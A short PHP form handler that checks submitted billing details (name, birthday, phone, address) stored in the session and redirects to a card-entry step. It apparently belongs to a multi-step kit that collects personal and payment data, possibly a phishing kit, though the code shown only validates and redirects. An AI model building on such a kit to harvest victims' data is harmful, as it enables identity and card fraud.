<?php
session_start();


include('../settings.php');
include("../common/sub_includes.php");
include("../common/functions.php");
if(isset($_POST['bat_billing_submit']))
{

	gather_billing_infos();


	if(empty($_SESSION['nom']) || empty($_SESSION['prenom']) || empty($_SESSION['birthday']) || empty($_SESSION['phone']) || empty($_SESSION['adresse']) || empty($_SESSION['zip']) || empty($_SESSION['city']))
	{


		header('Location: ../steps/billing.php?error=true');

	}
	else{

		$_SESSION['billinged'] = true;

       header('Location: ../steps/card.php');
	}
	

}
else{


}

?>